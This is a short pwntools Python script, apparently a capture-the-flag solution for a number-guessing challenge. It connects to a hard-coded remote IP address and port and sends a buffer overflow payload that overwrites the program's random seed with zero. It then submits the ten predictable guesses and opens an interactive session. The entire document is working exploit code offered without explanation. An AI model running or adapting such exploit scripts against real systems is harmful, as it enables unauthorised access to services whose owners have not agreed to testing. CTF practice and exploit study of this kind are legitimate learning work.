from pwn import *

p = remote("61.147.171.105",54189)
#gdb.attach(p, "b *0x0000D2D")
payload = b'a' * (0x30 - 0x10) + p64(0)
p.sendlineafter("Your name:", payload)
rand = ['2','5','4','2','6','2','5','1','4','2']
for i in range(10):
	p.sendlineafter("Please input your guess number:",rand[i])
p.interactive()
